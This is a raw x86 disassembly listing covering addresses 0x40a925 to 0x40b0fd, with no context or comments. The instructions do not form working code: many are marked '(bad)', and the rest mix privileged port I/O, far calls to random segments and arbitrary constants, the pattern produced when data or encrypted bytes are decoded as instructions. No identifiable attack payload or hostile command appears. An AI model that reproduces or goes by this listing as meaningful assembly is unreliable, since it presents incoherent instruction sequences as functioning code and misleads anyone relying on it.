  40a925:	sbb    DWORD PTR [edx],0x62
  40a928:	gs jno 0x40a922
  40a92b:	cmp    ebp,ecx
  40a92d:	adc    ch,dl
  40a92f:	add    eax,0xe2d524c4
  40a934:	push   eax
  40a935:	sbb    eax,0xc1c7e207
  40a93a:	stos   DWORD PTR es:[edi],eax
  40a93b:	mov    edx,0x2934d178
  40a940:	add    al,0x47
  40a942:	out    0xef,eax
  40a944:	or     DWORD PTR [esi-0x49c314be],ebp
  40a94a:	push   eax
  40a94b:	shr    DWORD PTR [edi],0x2a
  40a94e:	cmp    al,0x6
  40a950:	(bad)  
  40a951:	jecxz  0x40a9ba
  40a953:	adc    BYTE PTR [ebx+ebp*1],cl
  40a956:	ret    
  40a957:	cmp    eax,0xdbe4fa66
  40a95c:	pop    edx
  40a95d:	jns    0x40a9bc
  40a95f:	sar    DWORD PTR [esi-0x7e],1
  40a962:	inc    ebp
  40a963:	outs   dx,BYTE PTR ds:[esi]
  40a964:	ins    DWORD PTR es:[edi],dx
  40a965:	mov    DWORD PTR [ecx],eax
  40a967:	or     eax,0x3f98ca3c
  40a96c:	lds    ebx,FWORD PTR [ebx]
  40a96e:	loopne 0x40a945
  40a970:	leave  
  40a971:	add    edi,DWORD PTR [ebp+0x21]
  40a974:	mov    ds:0x7b9d097,al
  40a979:	add    ebx,DWORD PTR [ebx+0x22]
  40a97c:	call   0x8534:0x3d0cb1df
  40a983:	or     bl,BYTE PTR [esi-0x5b6dec64]
  40a989:	sahf   
  40a98a:	dec    esp
  40a98b:	aam    0x2a
  40a98d:	and    ch,ah
  40a98f:	rcr    DWORD PTR [edi],1
  40a991:	push   edx
  40a992:	jp     0x40a99d
  40a994:	pop    DWORD PTR [ebx]
  40a996:	add    esp,DWORD PTR [esi-0x32ae22c4]
  40a99c:	mov    ah,0x9f
  40a99e:	jns    0x40a93c
  40a9a0:	and    eax,0xf5b009d2
  40a9a5:	mov    bh,0xdb
  40a9a7:	sub    BYTE PTR ds:0x18cf842e,0x5b
  40a9ae:	mov    eax,DWORD PTR [esp+eax*2+0x77d4e3e2]
  40a9b5:	push   cs
  40a9b6:	dec    esi
  40a9b7:	push   esi
  40a9b8:	fstp   TBYTE PTR ds:0x3d25eacb
  40a9be:	aas    
  40a9bf:	or     eax,0xf154bc60
  40a9c4:	dec    ecx
  40a9c5:	or     edi,DWORD PTR [edx*8+0x78435c1]
  40a9cc:	(bad)  [edi+edi*2-0x53ef31b9]
  40a9d3:	or     DWORD PTR [esi],eax
  40a9d5:	iret   
  40a9d6:	xlat   BYTE PTR ds:[ebx]
  40a9d7:	(bad)  
  40a9d8:	pop    edi
  40a9d9:	or     DWORD PTR [ebx-0x70f39674],edx
  40a9df:	or     eax,0x37956ed5
  40a9e4:	(bad)  
  40a9e5:	(bad)  
  40a9e6:	popa   
  40a9e7:	dec    ebp
  40a9e8:	call   0xeb99:0x33e4ce2
  40a9ef:	ficomp DWORD PTR [eax-0x52]
  40a9f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9f3:	lock sub BYTE PTR [eax-0x39],bl
  40a9f7:	ins    BYTE PTR es:[edi],dx
  40a9f8:	out    0x5f,al
  40a9fa:	sub    ebx,ecx
  40a9fc:	pusha  
  40a9fd:	mov    dl,0x2a
  40a9ff:	mov    esi,eax
  40aa01:	sbb    al,0x75
  40aa03:	sahf   
  40aa04:	iret   
  40aa05:	mov    bh,0x22
  40aa07:	pusha  
  40aa08:	sub    BYTE PTR [edx],al
  40aa0a:	jge    0x40aa6f
  40aa0c:	aas    
  40aa0d:	sub    bh,BYTE PTR [esi]
  40aa0f:	cmc    
  40aa10:	mov    BYTE PTR es:[edx-0x3a5bcdab],dl
  40aa17:	lea    ecx,[edi+eax*4+0x4989a3fd]
  40aa1e:	jmp    0x5d16:0xa358eae
  40aa25:	leave  
  40aa26:	cld    
  40aa27:	lock dec ebx
  40aa29:	sbb    BYTE PTR [ecx],bl
  40aa2b:	ins    DWORD PTR es:[edi],dx
  40aa2c:	pop    ebx
  40aa2d:	jle    0x40aa3f
  40aa2f:	push   edx
  40aa30:	pop    ds
  40aa31:	xchg   BYTE PTR ds:0xbd85993a,al
  40aa37:	popf   
  40aa38:	mov    ecx,0x955d1e64
  40aa3d:	dec    esi
  40aa3e:	aas    
  40aa3f:	add    ebx,ebp
  40aa41:	mov    edi,0xefd95bd3
  40aa46:	aam    0xec
  40aa48:	mov    BYTE PTR [edx+0x5e2f889b],dl
  40aa4e:	sbb    edx,DWORD PTR [ecx-0x1e6af75b]
  40aa54:	jb     0x40aa58
  40aa56:	fcom   QWORD PTR ds:0xd41ce048
  40aa5c:	(bad)  
  40aa5d:	stos   DWORD PTR es:[edi],eax
  40aa5e:	xor    al,0x1a
  40aa60:	jb     0x40aa98
  40aa62:	jmp    0x2dddb3bd
  40aa67:	ret    
  40aa68:	sub    BYTE PTR [ebx-0x61bfdf7d],ch
  40aa6e:	cmp    esp,DWORD PTR [eax]
  40aa70:	mov    al,0xa2
  40aa72:	in     al,0x45
  40aa74:	retfw  
  40aa76:	xor    cl,BYTE PTR [ecx-0x890981b]
  40aa7c:	arpl   WORD PTR [edi-0x3c],bp
  40aa7f:	in     al,0xfd
  40aa81:	int3   
  40aa82:	and    BYTE PTR ds:0x9bc472cd,cl
  40aa88:	mov    eax,0xccc9fd28
  40aa8d:	pop    ebp
  40aa8e:	shl    DWORD PTR [esi],cl
  40aa90:	scas   al,BYTE PTR es:[edi]
  40aa91:	popa   
  40aa92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa93:	add    ecx,DWORD PTR [eax]
  40aa95:	jb     0x40aa2b
  40aa97:	xchg   DWORD PTR [edi+0x62df4de],eax
  40aa9d:	dec    edi
  40aa9e:	into   
  40aa9f:	icebp  
  40aaa0:	ins    DWORD PTR es:[edi],dx
  40aaa1:	les    eax,FWORD PTR [ecx+0x75]
  40aaa4:	sub    eax,0x5b741e5d
  40aaa9:	hlt    
  40aaaa:	push   0xae55751a
  40aaaf:	sub    DWORD PTR [ebx*8+0x687c743a],0xffffffff
  40aab7:	fdiv   DWORD PTR [esi-0x1fc21737]
  40aabd:	or     eax,0xb46e1891
  40aac2:	imul   DWORD PTR [ebx-0x2869db7d]
  40aac8:	jb     0x40ab14
  40aaca:	loope  0x40aafd
  40aacc:	adc    BYTE PTR [esi-0x30],al
  40aacf:	dec    esp
  40aad0:	push   es
  40aad1:	leave  
  40aad2:	dec    esp
  40aad3:	pop    es
  40aad4:	xor    dl,bl
  40aad6:	loope  0x40aaea
  40aad8:	call   0xea4bd492
  40aadd:	or     eax,0x9b6e154
  40aae2:	sbb    cl,BYTE PTR [edx+0x10f1a429]
  40aae8:	jecxz  0x40ab41
  40aaea:	lahf   
  40aaeb:	dec    edi
  40aaec:	cld    
  40aaed:	or     al,0x74
  40aaef:	adc    ecx,edi
  40aaf1:	ficom  DWORD PTR [esp+ebx*8-0x24]
  40aaf5:	mov    eax,0xd0a6d2dc
  40aafa:	mov    edi,0xa159e08c
  40aaff:	cwde   
  40ab00:	adc    al,0x96
  40ab02:	cmp    esi,edx
  40ab04:	mov    al,BYTE PTR [esi-0x33]
  40ab07:	leave  
  40ab08:	cli    
  40ab09:	jo     0x40aa8d
  40ab0b:	push   ebx
  40ab0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab0d:	frstor [ebx-0x30]
  40ab10:	or     esp,eax
  40ab12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab13:	js     0x40ab0e
  40ab15:	std    
  40ab16:	(bad)  
  40ab18:	pusha  
  40ab19:	jmp    0x6f12:0xb2aa9002
  40ab20:	mov    DWORD PTR [edx],esi
  40ab22:	ins    BYTE PTR es:[edi],dx
  40ab23:	sbb    eax,0xee12d0b7
  40ab28:	or     dh,ah
  40ab2a:	neg    dh
  40ab2c:	sti    
  40ab2d:	push   es
  40ab2e:	mov    eax,ds:0xc5b9d329
  40ab33:	aam    0x85
  40ab35:	scas   al,BYTE PTR es:[edi]
  40ab36:	mov    esi,0xf1996c2e
  40ab3b:	scas   al,BYTE PTR es:[edi]
  40ab3c:	pop    ebp
  40ab3d:	xor    BYTE PTR cs:[ecx-0x54e19d0f],ch
  40ab44:	bound  esi,QWORD PTR [ebx-0x59]
  40ab47:	jno    0x40abc6
  40ab49:	lahf   
  40ab4a:	arpl   WORD PTR [ecx-0x13],cx
  40ab4d:	and    DWORD PTR [eax+esi*8-0x33d5179e],edi
  40ab54:	add    bh,dl
  40ab56:	or     eax,0x4b6c1f68
  40ab5b:	cmp    DWORD PTR [esi-0x7ef9dea0],0xffffffca
  40ab62:	leave  
  40ab63:	sub    ebp,0x72938d13
  40ab69:	push   ds
  40ab6a:	adc    bh,BYTE PTR [ebx]
  40ab6c:	cmp    edx,DWORD PTR [eax]
  40ab6e:	sub    cl,BYTE PTR [ecx]
  40ab70:	iret   
  40ab71:	jae    0x40abb4
  40ab73:	jmp    0x40ab5a
  40ab75:	add    ah,BYTE PTR [esi+0x286dac4a]
  40ab7b:	and    ch,BYTE PTR [ecx+0x7b061e2a]
  40ab81:	dec    edi
  40ab82:	dec    esp
  40ab83:	lahf   
  40ab84:	jne    0x40abdd
  40ab86:	(bad)  
  40ab87:	call   0xceb0dfc3
  40ab8c:	pop    edx
  40ab8d:	popf   
  40ab8e:	adc    eax,0xa8c817c9
  40ab93:	daa    
  40ab94:	and    ebx,0x4
  40ab97:	fadd   DWORD PTR [ebx+edx*8+0x1956f29a]
  40ab9e:	push   cs
  40ab9f:	div    BYTE PTR [ecx]
  40aba1:	loop   0x40ab57
  40aba3:	sub    eax,0xc98b17a9
  40aba8:	mov    esp,DWORD PTR [edx+0x4c]
  40abab:	enter  0x7f97,0xc7
  40abaf:	sbb    cl,dl
  40abb1:	push   ebp
  40abb2:	xchg   edi,eax
  40abb3:	mov    ds:0x293a8a50,eax
  40abb8:	lock lahf 
  40abba:	sbb    al,0xcb
  40abbc:	enter  0xa5d3,0x1c
  40abc0:	ffreep st(2)
  40abc2:	stc    
  40abc3:	sub    BYTE PTR [esi+0x6d279fa0],bh
  40abc9:	xor    DWORD PTR [eax],esp
  40abcb:	xchg   ecx,eax
  40abcc:	das    
  40abcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abce:	arpl   si,bx
  40abd0:	imul   esi,DWORD PTR [edi-0x17b37ea1],0xe2d09d2c
  40abda:	inc    edi
  40abdb:	popa   
  40abdc:	pop    edx
  40abdd:	pusha  
  40abde:	int    0x97
  40abe0:	mov    eax,0xe78a0d00
  40abe5:	jg     0x40abf4
  40abe7:	(bad)  
  40abe9:	cmp    dh,BYTE PTR [edx]
  40abeb:	adc    esp,eax
  40abed:	xor    DWORD PTR [ebp+0x35],ebp
  40abf0:	call   0x2783:0x21f78e69
  40abf7:	sbb    BYTE PTR [esi+edi*4-0x34],dh
  40abfb:	dec    eax
  40abfc:	sub    ecx,edi
  40abfe:	pop    ebp
  40abff:	adc    al,BYTE PTR [ecx-0x7a6fbc2a]
  40ac05:	aad    0x91
  40ac07:	out    0x43,al
  40ac09:	add    bl,ah
  40ac0b:	mov    eax,0x8ff6fdad
  40ac10:	enter  0xddc7,0x89
  40ac14:	adc    BYTE PTR [ebx+0x68],0xd2
  40ac18:	sub    eax,0x18632171
  40ac1d:	mov    ch,0x7f
  40ac1f:	add    BYTE PTR [edi],ch
  40ac21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac23:	loopne 0x40ac2b
  40ac25:	retf   
  40ac26:	js     0x40ac76
  40ac28:	pop    ss
  40ac29:	mov    edi,ecx
  40ac2b:	push   cs
  40ac2c:	cli    
  40ac2d:	mov    ah,0xa1
  40ac2f:	inc    esi
  40ac30:	leave  
  40ac31:	adc    al,0xf0
  40ac33:	inc    DWORD PTR [esi]
  40ac35:	and    eax,0xeb4885ab
  40ac3a:	sub    DWORD PTR [ebx+0xb],0x28
  40ac3e:	fcom   QWORD PTR [ecx]
  40ac40:	pop    ds
  40ac41:	arpl   WORD PTR [edx],di
  40ac43:	xor    al,0x79
  40ac45:	jnp    0x40aca4
  40ac47:	ins    DWORD PTR es:[edi],dx
  40ac48:	pop    ebx
  40ac49:	adc    dh,dl
  40ac4b:	aaa    
  40ac4c:	push   0x187437bc
  40ac51:	xchg   ecx,eax
  40ac52:	xor    eax,0x5f791b0e
  40ac58:	xchg   edi,eax
  40ac59:	and    esi,esp
  40ac5b:	stos   BYTE PTR es:[edi],al
  40ac5c:	or     edi,eax
  40ac5e:	call   0x6d6a:0x27607a84
  40ac65:	mov    bh,0xd0
  40ac67:	mov    edi,0x57eacc5e
  40ac6c:	adc    dl,ch
  40ac6e:	ss xchg esp,eax
  40ac70:	sub    eax,0xeb558237
  40ac75:	xchg   edx,eax
  40ac76:	das    
  40ac77:	push   0x73d13170
  40ac7c:	pop    es
  40ac7d:	lea    eax,[esi]
  40ac7f:	jae    0x40acb0
  40ac81:	sub    BYTE PTR [ebx+0x6d],al
  40ac84:	xor    DWORD PTR [esi-0x12],esp
  40ac87:	and    DWORD PTR [edi],ebx
  40ac89:	or     eax,0xc689ffad
  40ac8e:	mul    DWORD PTR [edi+0x46]
  40ac91:	xchg   ebp,eax
  40ac92:	call   0xcfa26871
  40ac97:	push   ds
  40ac98:	and    al,0xa9
  40ac9a:	push   ebp
  40ac9b:	popf   
  40ac9c:	call   0x2c86614
  40aca1:	or     eax,DWORD PTR [edx-0x265377bf]
  40aca7:	cmp    bh,bh
  40aca9:	int    0xc9
  40acab:	test   al,0xcb
  40acad:	push   eax
  40acae:	daa    
  40acaf:	inc    eax
  40acb0:	xchg   edx,eax
  40acb1:	jge    0x40acb8
  40acb3:	retf   0x347e
  40acb6:	icebp  
  40acb7:	cmp    al,0x50
  40acb9:	cmp    cl,cl
  40acbb:	cmp    eax,0x35345930
  40acc0:	xchg   ecx,eax
  40acc1:	call   0x45d2:0xc55534f8
  40acc8:	mov    BYTE PTR [edi+0x385aa562],ch
  40acce:	enter  0x860d,0xb7
  40acd2:	out    dx,eax
  40acd3:	bnd jge 0x40ad4b
  40acd6:	into   
  40acd7:	inc    ebx
  40acd8:	into   
  40acd9:	(bad)  
  40acda:	ds int 0xff
  40acdd:	push   edx
  40acde:	jle    0x40ac8a
  40ace0:	and    DWORD PTR [esi+0x5a],esi
  40ace3:	inc    esi
  40ace4:	and    DWORD PTR [ebx],edx
  40ace6:	mov    cl,al
  40ace8:	mov    BYTE PTR [ebp-0x31b35ad9],0x74
  40acef:	mov    ch,0x80
  40acf1:	or     eax,0x6272fd11
  40acf6:	xchg   ecx,eax
  40acf7:	mov    ah,0x4c
  40acf9:	push   eax
  40acfa:	mov    al,0xac
  40acfc:	mov    bl,0xa0
  40acfe:	aas    
  40acff:	ss scas eax,DWORD PTR es:[edi]
  40ad01:	into   
  40ad02:	xlat   BYTE PTR ds:[ebx]
  40ad03:	mov    edi,0xd67c4983
  40ad08:	arpl   WORD PTR [edi+ecx*8-0x73],cx
  40ad0c:	pop    es
  40ad0d:	rcl    BYTE PTR [ecx],cl
  40ad0f:	jl     0x40ac95
  40ad11:	sahf   
  40ad12:	dec    edx
  40ad13:	iret   
  40ad14:	sbb    eax,0x14b773e
  40ad19:	inc    ebp
  40ad1a:	pushf  
  40ad1b:	cli    
  40ad1c:	adc    al,0x4d
  40ad1e:	jno    0x40ad6d
  40ad20:	xchg   edx,eax
  40ad21:	repz test edi,ecx
  40ad24:	daa    
  40ad25:	pusha  
  40ad26:	and    BYTE PTR [edi-0x70d1b7ab],ch
  40ad2c:	mov    ds:0x1283ea96,al
  40ad31:	lahf   
  40ad32:	jge    0x40ad19
  40ad34:	or     DWORD PTR [eax],eax
  40ad36:	repz data16 cmp ch,BYTE PTR [eax+ebp*4+0x12]
  40ad3c:	sahf   
  40ad3d:	call   0x9967:0x134bc0e4
  40ad44:	push   es
  40ad45:	sbb    DWORD PTR [ebx+edx*4-0x11a3a989],ecx
  40ad4c:	je     0x40ad3f
  40ad4e:	cmp    al,BYTE PTR [edi]
  40ad50:	mov    ds:0x550c3aff,al
  40ad55:	lods   al,BYTE PTR ds:[esi]
  40ad56:	push   ebx
  40ad57:	call   0x218caeba
  40ad5c:	sbb    bh,bh
  40ad5e:	push   ss
  40ad5f:	in     al,0x8a
  40ad61:	stc    
  40ad62:	push   0x350adbcd
  40ad67:	push   ecx
  40ad68:	cmc    
  40ad69:	cli    
  40ad6a:	jae    0x40ade1
  40ad6c:	lock out dx,al
  40ad6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad6f:	and    edx,DWORD PTR [ebx-0x17]
  40ad72:	in     al,dx
  40ad73:	push   ebp
  40ad74:	call   0xf9020df
  40ad79:	jg     0x40ad77
  40ad7b:	or     DWORD PTR [edi],edi
  40ad7d:	imul   esp,DWORD PTR [eax],0xb082668
  40ad83:	mov    BYTE PTR [esp+ecx*1+0xd],dl
  40ad87:	add    DWORD PTR [ebx+ebx*4+0x49a857cd],esi
  40ad8e:	mov    WORD PTR [edi-0x18a50cf],ds
  40ad94:	mov    ah,0x7e
  40ad96:	popf   
  40ad97:	cmovo  ebx,DWORD PTR [esi]
  40ad9a:	out    dx,eax
  40ad9b:	jmp    0x40ae14
  40ad9d:	mov    al,ds:0xfdaf4151
  40ada2:	stos   DWORD PTR es:[edi],eax
  40ada3:	test   eax,0xdbc8fe74
  40ada8:	dec    esp
  40ada9:	dec    edx
  40adaa:	mov    edx,0x1ef500d2
  40adaf:	adc    DWORD PTR [edi-0xc],eax
  40adb2:	adc    al,0x6c
  40adb4:	ja     0x40ad83
  40adb6:	adc    al,0x8b
  40adb8:	call   0x110c40f8
  40adbd:	ret    0x63ff
  40adc0:	in     al,dx
  40adc1:	pop    ebp
  40adc2:	mov    ds:0x7b8c2577,al
  40adc7:	adc    esi,edx
  40adc9:	add    DWORD PTR [edi+0x2],0xffffffdb
  40adcd:	cli    
  40adce:	add    al,0x3c
  40add0:	dec    eax
  40add1:	jecxz  0x40ad89
  40add3:	popf   
  40add4:	lds    ecx,FWORD PTR [eax]
  40add6:	jge    0x40addd
  40add8:	sub    BYTE PTR [edi-0x45],ch
  40addb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40addc:	(bad)  
  40addd:	fst    QWORD PTR [edx+0x30ab6a12]
  40ade3:	cli    
  40ade4:	mov    edi,DWORD PTR [edx-0x1e75acff]
  40adea:	jmp    0xe3e6:0x248b09cf
  40adf1:	cld    
  40adf2:	les    edi,FWORD PTR gs:[ebp+0x793fe9f4]
  40adf9:	arpl   WORD PTR [edi],dx
  40adfb:	mov    ds:0x554397a1,eax
  40ae00:	xchg   BYTE PTR [edx+0x73c23d78],ch
  40ae06:	call   DWORD PTR [edi+esi*2]
  40ae09:	adc    esi,ebx
  40ae0b:	jl     0x40ae0c
  40ae0d:	xor    ebp,edi
  40ae0f:	mov    dh,0xd3
  40ae11:	and    DWORD PTR [edi+0x3c997573],0xffffff92
  40ae18:	fisttp QWORD PTR [ebp+0x4c405c81]
  40ae1e:	nop
  40ae1f:	mov    ch,0x71
  40ae21:	cmp    DWORD PTR [ebx+0x34],edi
  40ae24:	ins    DWORD PTR es:[edi],dx
  40ae25:	mov    al,ds:0x1c736e6
  40ae2a:	sbb    edi,DWORD PTR [ecx-0x9]
  40ae2d:	mov    ch,0x52
  40ae2f:	or     ebx,DWORD PTR [esi+0x7fd54d58]
  40ae35:	loope  0x40ae2d
  40ae37:	aad    0x3f
  40ae39:	inc    edi
  40ae3a:	pop    ebp
  40ae3b:	xchg   ebp,eax
  40ae3c:	inc    esi
  40ae3d:	sub    ebx,DWORD PTR [ebx]
  40ae3f:	enter  0x2fbe,0xc9
  40ae43:	iret   
  40ae44:	fnsave [edx+0x72]
  40ae47:	mov    eax,0xf5921ca5
  40ae4c:	(bad)
  40ae51:	jmp    0x658e7a05
  40ae56:	rcl    BYTE PTR [edi+0x35040e49],1
  40ae5c:	inc    ebp
  40ae5d:	lock sub DWORD PTR [edi-0x66],edi
  40ae61:	fist   WORD PTR [ecx+0x66]
  40ae64:	sbb    al,0x7d
  40ae66:	add    bl,dh
  40ae68:	or     ah,dl
  40ae6a:	push   ebx
  40ae6b:	pushf  
  40ae6c:	shl    BYTE PTR [ebx],cl
  40ae6e:	and    al,0xba
  40ae70:	cwde   
  40ae71:	sbb    BYTE PTR [esi],al
  40ae73:	adc    cl,dl
  40ae75:	rcl    DWORD PTR ds:0xaa952a06,0xf7
  40ae7c:	jmp    0x2e2f:0x17841280
  40ae83:	inc    esp
  40ae84:	inc    edi
  40ae85:	lds    eax,FWORD PTR [edi]
  40ae87:	adc    eax,0x3475599d
  40ae8c:	retf   0x904e
  40ae8f:	inc    ebp
  40ae90:	sbb    al,0x19
  40ae92:	in     eax,0xe7
  40ae94:	mov    BYTE PTR [ecx+0x109c74fe],cl
  40ae9a:	mul    BYTE PTR [eax]
  40ae9c:	test   DWORD PTR [ecx+0x36afe95b],0xd39cb5c0
  40aea6:	lahf   
  40aea7:	xor    al,0xb4
  40aea9:	js     0x40ae50
  40aeab:	or     ah,BYTE PTR [edx]
  40aead:	jg     0x40aeca
  40aeaf:	(bad)  
  40aeb0:	pop    edi
  40aeb1:	jmp    0x7cad:0xb8a55835
  40aeb8:	cmp    esi,DWORD PTR [esi+edx*1+0x759af342]
  40aebf:	xor    al,0x82
  40aec1:	jno    0x40ae66
  40aec3:	adc    al,BYTE PTR [eax+0x4d1ed88c]
  40aec9:	push   ss
  40aeca:	arpl   WORD PTR [ecx+0x8a2d34f],bp
  40aed0:	sub    al,0x37
  40aed2:	or     esi,DWORD PTR [eax+0x2c]
  40aed5:	out    dx,al
  40aed6:	gs mov bl,0xf4
  40aed9:	jae    0x40aeac
  40aedb:	les    esi,FWORD PTR [esi+0x2]
  40aede:	ds jne 0x40aee7
  40aee1:	jne    0x40aec5
  40aee3:	push   0x11
  40aee5:	mov    ebp,0x3a9675ed
  40aeea:	mov    edx,0xf238843c
  40aeef:	dec    ebp
  40aef0:	in     eax,0x44
  40aef2:	pop    edi
  40aef3:	idiv   DWORD PTR [ebx+0x3c844ccc]
  40aef9:	test   eax,0x70c9d0cd
  40aefe:	push   es
  40aeff:	aas    
  40af00:	arpl   WORD PTR [ebx+0x5b],ax
  40af03:	jmp    0xbf9c190
  40af08:	lds    ebp,FWORD PTR [ebx-0x2d]
  40af0b:	dec    edx
  40af0c:	je     0x40aedc
  40af0e:	cwde   
  40af0f:	xor    eax,0xb25d9409
  40af14:	xlat   BYTE PTR ds:[ebx]
  40af15:	outs   dx,BYTE PTR ds:[esi]
  40af16:	xor    edx,edx
  40af18:	out    0x9b,al
  40af1a:	xchg   edx,eax
  40af1b:	adc    al,0x13
  40af1d:	call   0x195f:0xd5d66426
  40af24:	push   eax
  40af25:	sbb    eax,0xe37dee3d
  40af2a:	jg     0x40af54
  40af2c:	out    dx,al
  40af2d:	dec    edi
  40af2e:	cmp    eax,0x26b56d58
  40af33:	mov    ebp,0xe5b0abf1
  40af38:	inc    ecx
  40af39:	dec    esp
  40af3a:	stc    
  40af3b:	mul    DWORD PTR [edx+0x46a4dbb7]
  40af41:	jbe    0x40af5b
  40af43:	stos   DWORD PTR es:[edi],eax
  40af44:	ret    
  40af45:	je     0x40af0f
  40af47:	cmp    BYTE PTR [ecx-0x1593cfee],cl
  40af4d:	jecxz  0x40af31
  40af4f:	mov    BYTE PTR [ebx],al
  40af51:	pop    edx
  40af52:	sbb    bl,bh
  40af54:	lea    esi,ds:0x3528f187
  40af5a:	retf   0x20e5
  40af5d:	jmp    0xd9e148fd
  40af62:	lods   al,BYTE PTR ds:[esi]
  40af63:	push   ss
  40af64:	fisttp WORD PTR [eax+0x572b4f86]
  40af6a:	lea    esi,[eax-0x43]
  40af6d:	jb     0x40af06
  40af6f:	test   ebp,0x6b71e74
  40af75:	retf   0x9696
  40af78:	data16 fwait
  40af7a:	daa    
  40af7b:	bound  edx,QWORD PTR [esi-0x70]
  40af7e:	add    bh,BYTE PTR [ecx+esi*1-0x3637d6a9]
  40af85:	xor    edx,DWORD PTR [ebx-0x67ff59c3]
  40af8b:	dec    ebp
  40af8c:	dec    edi
  40af8d:	cmp    eax,0xcce3a48d
  40af92:	cli    
  40af93:	cmp    ecx,edx
  40af95:	std    
  40af96:	pushf  
  40af97:	sub    bl,dl
  40af99:	cmp    eax,0xdc19abb3
  40af9e:	mov    eax,0xd307a90b
  40afa3:	data16 stc 
  40afa5:	xchg   DWORD PTR [ecx+0x10e7b6ff],ebx
  40afab:	add    DWORD PTR [eax],esp
  40afad:	push   ebx
  40afae:	popa   
  40afaf:	or     esp,DWORD PTR [esi+0x516253fe]
  40afb5:	inc    edx
  40afb6:	lods   al,BYTE PTR ds:[esi]
  40afb7:	gs jae 0x40af90
  40afba:	mov    eax,ds:0x96d97ec4
  40afbf:	push   eax
  40afc0:	xchg   edx,eax
  40afc1:	and    bh,BYTE PTR [ecx+0x7db97560]
  40afc7:	ja     0x40afb6
  40afc9:	cld    
  40afca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afcb:	mov    ecx,0xabc4314f
  40afd0:	(bad)  
  40afd1:	push   esp
  40afd2:	push   edi
  40afd3:	mov    edi,0x736e64d6
  40afd8:	mov    bh,0x5e
  40afda:	mov    ebx,0x8c2ecbba
  40afdf:	jae    0x40aff9
  40afe1:	mov    dh,0x9f
  40afe3:	popf   
  40afe4:	bound  ebx,QWORD PTR [ebx]
  40afe6:	or     eax,0xc85358bc
  40afeb:	fst    QWORD PTR [esi-0x3]
  40afee:	or     edx,edx
  40aff0:	push   edx
  40aff2:	shl    dh,0xe5
  40aff5:	aam    0x72
  40aff7:	pushf  
  40aff8:	or     DWORD PTR [edi],esi
  40affa:	add    al,0xc6
  40affc:	ds into 
  40affe:	rcr    ecx,1
  40b000:	cmc    
  40b001:	(bad)  
  40b002:	add    al,0xb4
  40b004:	outs   dx,DWORD PTR ds:[esi]
  40b005:	push   esi
  40b006:	es dec eax
  40b008:	jmp    0x806041be
  40b00d:	mov    edi,0xd0b2092b
  40b012:	jno    0x40b022
  40b014:	xor    al,0xfe
  40b016:	mov    ds:0x51b56f1d,al
  40b01b:	retf   
  40b01c:	mov    ds,edi
  40b01e:	xor    bh,cl
  40b020:	sub    eax,0xd855fe99
  40b025:	scas   al,BYTE PTR es:[edi]
  40b026:	arpl   WORD PTR [ecx+0xf],di
  40b029:	cmp    eax,0x47bad84c
  40b02e:	sbb    ch,BYTE PTR ds:0xf77a01e4
  40b034:	pusha  
  40b035:	(bad)  
  40b036:	and    eax,0x6996db4a
  40b03b:	sub    al,0xfb
  40b03d:	loop   0x40b01e
  40b03f:	mov    al,0xfe
  40b041:	lods   al,BYTE PTR ds:[esi]
  40b042:	dec    ebp
  40b043:	cmc    
  40b044:	aam    0x7
  40b046:	jl     0x40b006
  40b048:	ja     0x40b0c5
  40b04a:	dec    esp
  40b04b:	int3   
  40b04c:	in     al,dx
  40b04d:	aad    0x8c
  40b04f:	sbb    ebx,DWORD PTR [eax]
  40b051:	jg     0x40b0c8
  40b053:	inc    esp
  40b054:	fstsw  WORD PTR [edx-0x66]
  40b058:	push   ds
  40b059:	push   es
  40b05a:	push   eax
  40b05b:	(bad)  
  40b05c:	hlt    
  40b05d:	pop    eax
  40b05e:	xchg   ebp,eax
  40b05f:	call   0x7966dc2e
  40b064:	ja     0x40b083
  40b066:	cmp    dh,BYTE PTR [eax-0x7e]
  40b069:	imul   esp,edi,0x46
  40b06c:	mov    ch,0x8c
  40b06e:	dec    ebx
  40b06f:	and    BYTE PTR [ebx+0x15],al
  40b072:	pusha  
  40b073:	mov    edx,0x56ef02d4
  40b078:	cmp    eax,0x286a0d1b
  40b07d:	push   ebp
  40b07e:	sbb    eax,0x312837ac
  40b083:	fidiv  DWORD PTR [ebx-0x55]
  40b086:	add    DWORD PTR [edi-0x5ece518e],esi
  40b08c:	sar    ah,cl
  40b08e:	lods   eax,DWORD PTR ds:[esi]
  40b08f:	xor    DWORD PTR [edx-0xc386cc4],esi
  40b095:	mov    al,0x34
  40b097:	xor    DWORD PTR [ebp+0x7bb1f70c],0xeea9ff9b
  40b0a1:	adc    BYTE PTR [ecx+0x18],0x23
  40b0a5:	shr    BYTE PTR [eax+0x306658db],1
  40b0ab:	ret    0xc74d
  40b0ae:	in     eax,0xdd
  40b0b0:	mov    ds:0xebffdc84,al
  40b0b5:	xor    DWORD PTR [edi+0x71fd3c70],eax
  40b0bb:	test   DWORD PTR [edi-0x7a],ecx
  40b0be:	mov    dl,0x7f
  40b0c0:	ja     0x40b08f
  40b0c2:	stos   BYTE PTR es:[edi],al
  40b0c3:	ss sti 
  40b0c5:	dec    esp
  40b0c6:	and    eax,0xa088233b
  40b0cb:	push   ebx
  40b0cc:	mov    ds,eax
  40b0ce:	pop    edi
  40b0cf:	jp     0x40b0f3
  40b0d1:	xor    eax,0xee493e58
  40b0d6:	or     dl,BYTE PTR [ecx-0x7e26f3e7]
  40b0dc:	repnz sub dl,ah
  40b0df:	shl    BYTE PTR [esi-0x1be19bf0],0x7
  40b0e6:	shr    BYTE PTR [eax+0x7a60207c],0xe5
  40b0ed:	aaa    
  40b0ee:	inc    ebp
  40b0ef:	lahf   
  40b0f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0f1:	xor    bl,dh
  40b0f3:	dec    esi
  40b0f4:	sbb    DWORD PTR [edi+0x2474ac47],0xffffffd1
  40b0fb:	jecxz  0x40b08c
  40b0fd:	test   DWORD PTR [esi-0x5f],0xacfadcfb
